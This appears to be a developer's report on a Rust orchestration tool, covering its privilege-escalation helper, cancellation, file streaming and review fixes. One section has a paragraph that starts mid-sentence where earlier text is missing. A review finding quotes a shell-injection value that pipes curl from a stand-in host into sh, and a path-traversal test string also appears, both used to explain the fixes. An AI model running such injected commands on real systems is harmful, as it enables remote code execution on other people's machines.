## What was built, per brief item

1. **`--helper` mode and the `Elevated` backend** (`crates/rustible-sdk/src/backend/elevated.rs`,
   `system.rs`, `runtime.rs`). `Elevated { user }` implements `Backend`; every
   primitive (`read`, `write`, `stat`, `mkdir_all`, `remove`, `set_mode`,
   `set_owner`, `copy`, `spawn`) is a `HelperRequest { checking, op }` frame
   on the helper's stdin answered by a `HelperResponse` on its stdout, framed
   with `protocol::{read_frame, write_frame}`. The helper is spawned on first
   use as `<method> -n -u <user> <current exe> --helper` (method from the new
   `HostInfo.escalate_method`, default `sudo`; `doas` supported; `none`
   refuses), one per identity for the whole run, shared by every `System`
   clone through an `Escalation` registry, closed on drop (stdin closed, two
   second wait, then kill). `--helper` is `serve_helper`: a `Local` backend in
   a request loop that also refuses mutations when the request says the
   caller is in `check`, so the mutation guard holds on both sides. Errors
   carry the errno so `NotFound` survives the round trip; a helper that dies
   (sudo refused, crash) is reported with its exit status and the tail of its
   stderr, which is otherwise forwarded line by line. `System::as_user`
   switches the backend to the helper when the user differs from
   `facts.user`, back to `Local` when it is the same, and keeps the old
   `sudo -n -u` command prefix only on `Fake` systems. `CmdRan` events keep
   flowing from the main process's `Cmd::run`, tagged with the identity,
   because the helper only executes; the pretty renderer shows `as root`.
   Sudo password: `Start.escalate_password: Option<Secret>` (serde default),
   fed with `sudo -S -p ''` only after `sudo -n -u <user> true` was refused
   (see Decisions), zeroized on drop; the spike CLI takes it from an
   environment variable named by `--escalate-password-env`.
2. **`Cancel`** (`channel.rs`, `ctx.rs`, `runtime.rs`, CLI `main.rs`,
   `transport.rs`). In `--remote` mode a stdin reader thread feeds every
   frame after `Start` into the `Channel`: `Cancel` sets a sticky flag with
   its reason; EOF closes the inbox and also cancels. `Ctx::step` checks the
   flag before `check` (the step is not started, error "step `x` not
   started: cancelled: ...") and between `check` and `apply` (the step is
   reported `Failed` with the reason and nothing is applied). The
   orchestrator turns ctrl-c (`tokio::signal::ctrl_c`) into a `Cancel` frame
   to every host, then waits ten seconds for the binary to stop between
   steps and kills it otherwise: the local process group, or over SSH every
   process naming the binary's cached path plus their children. For ctrl-c
   to reach only the orchestrator, local children start in their own process
   group and the SSH transport uses openssh's `native-mux` feature (no
   per-command `ssh` client in the terminal's foreground group).
3. **Streaming** (`protocol.rs`, `stream.rs`, `channel.rs`, `ctx.rs`, CLI).
   Protocol 3 adds the reserved frames from vision 5.5: `FileRequest`
   (up), `FileChunk`/`FileDenied` (down), `FetchChunk` (up), correlated by
   request id; requests may overlap (the inbox queues frames per id).
   Chunks are 1 MiB; byte fields travel as base64. `ctx.local_file(path)`
   writes the chunks to `<temp dir>/.rustible-XXXX/<req>/<file name>`,
   removed when the run's last `Ctx` drops. `ctx.local_secret(path)` returns
   a `Secret` (a `Zeroizing<Vec<u8>>`, redacted `Debug`, never on disk: the
   chunks go straight into the zeroized buffer and every frame body is
   zeroized after decoding). `ctx.fetch(remote, dest)` reads through `sys`
   and sends `FetchChunk`s; `dest` with a trailing slash lands at
   `<dest>/<host>/<file name>`. Orchestrator side: `stream::WorkspaceFiles`
   resolves paths relative to the workspace root and denies absolute paths,
   `..`, symlink escapes, missing files, and non-files with a reason the
   binary reports verbatim; fetched files are written in order under the
   root. A local run (no `--remote`) serves files from the working
   directory through the same type. Example playbooks
   `examples/workspace/playbooks/cadu/{escalation,streaming,slow}.rs`; the
   50 MB `files/big.bin` and `files/secret.txt` are generated by the
   done-when script and gitignored, as is `out/`.

## Protocol version 2 to 3

`PROTOCOL_VERSION` goes from 2 to 3. What changed on the wire: four new
frames (`Down::FileChunk`, `Down::FileDenied`, `Up::FileRequest`,
`Up::FetchChunk`), the optional `Start.escalate_password`, and base64 for
byte fields. Compatibility story:

- The orchestrator compares `Hello.protocol` with its own constant and stops
  with "protocol mismatch: orchestrator speaks 3, binary speaks N; rebuild
  the workspace against this rustible" before sending anything but `Start`.
  A stale cached binary on a target is therefore rejected, never driven with
  frames it cannot parse. Vision 5.5: a mismatch means "rebuild", never
  silent breakage.
- `Start.escalate_password` has `#[serde(default)]`, so a version 3 binary
  accepts a `Start` from an orchestrator that does not send the field; it is
  the new `Down` variants a version 2 binary would fail to deserialize, and
  the new `Up` variants a version 2 orchestrator would choke on, that force
  the bump.
- Helper frames (`HelperRequest`/`HelperResponse`) are not versioned: both
  ends are always the same binary (the helper is `<own exe> --helper`), so
  the new `HelperOp` variants from the merge need no bump.
- The reserved tier 3 frames (`BarrierWait`, `BarrierRelease`, `PeerFacts`)
  are still not defined; adding them will be the next bump.

## Decisions

Recorded in `docs/plan/DECISIONS.md` under rule 2.3:

- `HostInfo.escalate_method` rather than a `Start` field.
- Base64 for byte fields on the wire; zeroized frame bodies.
- EOF on stdin in `--remote` mode cancels the run.
- `fetch` to a trailing-slash destination adds `<host name>/`.
- `fetch` reads the whole file through `sys` (64 MiB cap when escalated).
- Password fed to `sudo -S` only after `sudo -n` was refused; `doas` with a
  password is an error.
- `Fake` systems keep the sudo command prefix on `as_user`; real ones do not.
- `native-mux` SSH transport and local process groups so ctrl-c does not
  kill children before `Cancel` is sent.
- Remote kill by matching the binary's cached path plus children.
- Local runs serve `local_file` from the working directory.
- `Cancel` between `check` and `apply` fails the step.
- (merge) `Elevated` proxies main's seven new `Backend` primitives with two
  new `HelperResponse` variants; `stat_follow`, `read_link`, `read_dir` count
  as reads for the check-mode guard.

### One bug the rework found

`Transport::kill` killed the shell that was doing the killing. The
remote kill takes its candidates from `pgrep -f <the binary's path>`,
and the shell running that loop has the path on its own command line, so
it matched itself: it died partway through the loop, and whether the
real targets died first came down to pid order. The visible symptom was
the ARM host being closed with "FAILED: the remote process has
terminated", the mux channel's view of its own command being killed,
rather than with the cancellation. `/proc/<pid>/exe` is now the filter:
only processes the kernel says are running the binary get signalled,
with their children. `kill_script` has a unit test for the guard
preceding the kill and for the path staying quoted. The same flaw was in
the pre-merge branch and in the old done-when script's leftover check,
so it predates the merge; the shipped CLI is where it got caught,
because M3's ControlMaster session surfaces the error instead of
swallowing it.

### `Local::spawn`'s stdin fix reaches the escalated path

PR 16 changed `Local::spawn` to feed a child's stdin from a thread the
parent joins after the child exits, because the previous inline write
deadlocks against a child that fills its output pipe before reading. The
helper does not write to a child's stdin itself: `HelperOp::Spawn` calls
`local.spawn(&spec)`, so an escalated `ctx.sys().cmd(..).stdin(..)`
inherits the fix with nothing to mirror. A test now pins that through
the helper boundary, running a 1 MiB stdin against a child that writes
1 MiB before reading a byte. It is bounded by a channel timeout, so a
regression fails in thirty seconds rather than wedging the suite;
reverting `Local::spawn` to the inline write fails it and hangs
`local`'s own equivalent test, which has no bound.

The rest of PR 16's SDK surface needed nothing: the `Backend` trait,
`CmdSpec` and `spawn`'s signature are unchanged, so `Elevated` proxies
no new variants. `Escalation` and `Planned` sit side by side in
`system.rs`.

`argv` by skipping the escalation words, but the binary sits at no fixed
place in `exec_argv`'s output: bare it is first, behind `sudo -n` third,
and behind `sudo -n -u <someone-not-root>` fifth. The scan returned
`-u`, `pgrep -f '-u'` matched half the box, and the `/proc/<pid>/exe`
guard added earlier in this branch then rejected every candidate. On a
host with `escalate_user="admin"`, ctrl-c printed "the binary was
killed", the orchestrator exited 2, and the playbook kept running on the
target. `Transport::spawn` now takes the path `run::remote_path`
produced and `Proc` stores it; the upload shell passes `None` and is
never a kill target. A test asserts the scan finds the binary for a root
`escalate_user` and `-u` for a non-root one, so the trap is written down
where the next person will meet it.

**2. A file transfer blocked the select loop.** Every chunk of a
`FileRequest` went out inline, so nothing watched `cancel_rx` for the
length of a stream: 433 s for 50 MB over Tailscale, during which ctrl-c
set the flag, sent no `Cancel` and started no grace timer. The chunk
loop checks the flag between chunks and answers `FileDenied` with
"cancelled while the file was being sent", so the binary's `local_file`
fails at once instead of waiting for chunks that will not come. The
done-when block gained a leg for this, since it was the finding's whole
point: ctrl-c 6 MB into the 50 MB stream to the ARM box is answered in
2 s rather than after another 420.

**3. Ctrl-c was seen once, and only inside `drive_frames`.** The watcher
awaited `ctrl_c()` a single time and its task then ended while tokio's
handler stayed installed, so later presses were swallowed. Combined with
the `process_group(0)` this branch added to local children, a ctrl-c
during connect, probe, build or upload did nothing at all, which is a
regression in reach against plain SIGINT even though the process group
is what makes the `Cancel` path work. The watcher re-arms in a loop, a
second press exits the process at once saying what it leaves behind, and
the pipeline checks the flag after connect and after the build rather
than uploading and starting playbooks nobody is waiting for.

**4. A dead helper was replaced, not just dropped.** `call` dropped the
connection but left `spawner` populated, so the next primitive spawned a
fresh helper. On a host needing `sudo -S`, a wrong
`--escalate-password-env` meant one sudo authentication attempt per file
operation: a syslog line and mail to root each time, and `pam_faillock`
lockout after a handful. The first transport failure is latched and
reported by every later call. Logical errors travel as
`HelperResponse::Err` and do not latch, so a missing file still reads as
`NotFound`.

**5. An escalated read or write moves a file whole, in one frame.** Over
`MAX_FRAME_PAYLOAD` (about 48 MiB: the 64 MiB frame ceiling less
base64's 4/3 inflation and the JSON envelope) it failed inside the
framing with "frame of N bytes exceeds limit", naming neither the file
nor the helper. `ctx.as_root()` with `file::Copy` on a 60 MB artifact
hit it, working unescalated and failing escalated. The guard is at the
helper boundary rather than only in `fetch`, so it covers every
primitive, and it names the file, both numbers and the identity. **The
limit itself stands**: closing it means streaming `Read` and `Write`
across the helper as chunked frames the way `FileChunk` already does,
which is a protocol bump and more than this branch should carry. Recorded
in DECISIONS.md as a known gap with that closure.

**6. The inbox was unbounded.** The reader thread always outran the
consumer writing to disk, so `pending` grew to the size of the file and a
50 MB stream sat in memory on the target, which is what chunking exists
to avoid. It holds eight frames now and the reader waits above that. One
global bound is safe because at most one request is in flight (`Ctx` is
`!Send`, and every transfer blocks the playbook thread); concurrent
requests would need per-request flow control, since one reader thread
blocked on a full queue stops delivering every id. Backpressure
introduced a hazard of its own, which finding 2's fix then made
reachable: a consumer that gives up part way leaves the orchestrator
still sending, and those frames would fill the inbox and block the thread
that delivers `Cancel`. A request whose consumer has gone is marked
abandoned and its later frames are dropped on arrival.

**7. `resolve_dest` created directories before checking confinement.** A
denied fetch through an in-workspace symlink pointing outward still made
`<outside>/deep/nested` on the orchestrator before saying no.
Confinement is decided first, against the deepest ancestor that already
exists. The post-creation check stays: the last component may be a
symlink planted in between.

### What finding 2's new leg actually shows

Cancelling during the 50 MB transfer was run twice on the ARM box, and
the two runs bracket the behaviour rather than agreeing, which is worth
stating plainly.

| | link speed | in flight when interrupted | outcome |
| --- | --- | --- | --- |
| first run | fast enough for 8 MB in ~15 s | small | orchestrator exited 2 after 2 s, no kill needed |
| logged run | ~50 KB/s (1111 s for 50 MB) | 6 MB sent, 3 MB written | binary killed at the 10 s grace, orchestrator exited 2 after 45 s |

Both are the fix working. Before it, neither run would have sent
`Cancel` at all until the transfer finished, 433 s to 1111 s later. What
the slow run shows is the floor underneath the fix: the orchestrator
stops sending and writes `Cancel` at once, but that frame queues behind
whatever is already in the ssh channel and socket buffers, and the binary
cannot act until it has drained them. At 50 KB/s, 3 MB in flight is about
a minute, past the grace, so the binary was killed. Lowering that floor
means a smaller in-flight window in the transport, not a change in this
code.

The kill had a consequence the `cadu/slow` leg never exposed, because
that playbook streamed nothing: a killed binary left its run temp
directory on the target, holding as much as the largest file it had
received, with nothing to collect it. That is fixed rather than
recorded; see below.


### Closing the temp-directory leak

The run's temp directory is now `${TMPDIR:-/tmp}/.rustible-<run id>`
rather than a random `tempfile` name. A random name is known only to the
binary, and SIGKILL runs no destructor, so a cancelled run left the
directory and every streamed file in it behind. `Start.run_id` already
existed and the orchestrator already generates it, so both sides compute
the same name through one function, `stream::run_dir_name`, and
`Transport::kill` removes exactly that directory after the binary is
gone.

Four things this had to get right.

- **It must not depend on the killed binary.** It does not: the removal
  is `rm -rf` from the orchestrator's side, after the kill rather than
  before, so the binary cannot recreate it.
- **A clean run must still clean up the way it does today.** The
  drop-time removal stays; the kill path is belt and braces, and `rm -rf`
  on a directory that is already gone is not an error. Only the kill path
  runs the removal at all.
- **Root-owned directories.** An escalated playbook creates the directory
  as the escalated user, so removing it needs the same prefix. The
  prefix `exec_argv` builds is now factored out as `escalate_prefix` and
  travels in `KillTarget`, so the removal runs as whoever created the
  thing being removed.
- **The run id arrives over the wire.** `run_dir_name` reduces it to
  characters that cannot escape the temp directory or confuse a shell,
  because a raw id would be a directory-creation primitive; there is a
  test for `../../etc/cron.d/x` and friends. The name is now predictable,
  and `/tmp` is world-writable, so the directory is created with
  `create_dir` rather than `create_dir_all` (it refuses anything already
  at the path instead of following it) and chmodded 0700.

**Verified on both hosts, both ownership cases**, which is the part worth
being precise about:

| | during the run | after the kill |
| --- | --- | --- |
| local, unescalated | `drwx------ cadu cadu` | gone |
| arm, unescalated | `drwx------ cadu cadu` | gone |
| local, `escalate = true` | `drwx------ root root` | gone |
| arm, `escalate = true` | `drwx------ root root` | gone |

The escalated case was run by temporarily setting `escalate = true` on
`cadu/slow.rs`; the playbook is committed unescalated, so the done-when
log shows the unescalated case only and this table is where the root
case is recorded.

`cadu/slow.rs` now streams `hosts.kdl` before its 30 s step, so the
done-when block's own cancel leg exercises the interaction this
milestone owns rather than only the sleep. It streams a committed file,
so it needs no generated fixture, and section 3 checks that no
`.rustible-*` directory survives the kill on either host.

## Review round 2

One finding, plus one thing it led me to check.

**The escalation prefix went into a shell unquoted.** `remove_run_dir_script`
interpolated `t.escalate.join(" ")` straight into the script, and that
prefix carries `escalate_user`, an unvalidated string from the KDL
inventory. An inventory with `escalate_user="x; curl evil.example|sh"`
ran that on the target the moment a run was cancelled. What makes it
worth fixing rather than shrugging at is the asymmetry the reviewer
named: the same value is safe everywhere else, because `exec_argv`
passes it as an argv element and `openssh` quotes each one. Only these
scripts put it through a shell. Every prefix word is now `shell_quote`d
before joining, like the run directory and the binary path already were,
and a test asserts a metacharacter-carrying `escalate_user` comes out as
one quoted word in both scripts.

**Recommended, not built.** `escalate_user` deserves a username charset
check at inventory load. It would make the inventory's contract explicit
and turn a bad value into a load error naming the node, rather than a
confusing `sudo -u` failure at run time. That is M2's file and a
separate change, so it is a DECISIONS.md recommendation rather than a
commit here.

### What the finding led me to check

If the prefix matters for removing the directory, it should matter for
killing the processes, and `kill_script` did not use it. It turned out to
be the same class of defect as the round's first finding: a kill that
reports success without killing.

`/proc/<pid>/exe` needs ptrace access, so the login user cannot read it
for an escalated run's processes. The guard I added earlier this round,
which is what makes the kill precise, therefore skipped **every**
candidate of an escalated run, and `kill` would have been refused even if
one had matched. Such a run survived the script entirely.

It looked correct in testing because the processes did die: sshd tears
down the session's process tree when the orchestrator exits. That is luck
rather than cancellation, and it would evaporate if a step daemonised
something or the transport changed. I separated the two by running both
script forms against a live root-owned binary on the ARM box:

| script form | root-owned binary afterwards |
| --- | --- |
| unescalated (what was there) | still running |
| escalated (what is there now) | killed |

`kill_script` now runs behind the binary's own escalation prefix, so
`pgrep`, the `/proc/<pid>/exe` guard and `kill` all run as the identity
that owns the processes.

One detail worth naming: `remove_run_dir_script` expands `${TMPDIR:-/tmp}`
in the session's own shell and passes the result to `rm` as an argument,
rather than expanding it inside the escalated shell. `sudo` resets the
environment, so expanding it inside would read root's `TMPDIR` and not
the one the binary actually used.

**Also noted:** `run_dir_name`'s filtering is not injective, so `a/b` and
`ab` both give `.rustible-ab` and an unsanitisable id gives a fixed
`.rustible-unnamed`. With `create_dir` refusing an existing path a
collision is loud rather than silent, and the orchestrator sends hex ids,
so it is not reachable today. That is now in the function's doc comment
so nobody later feeds it something structured.
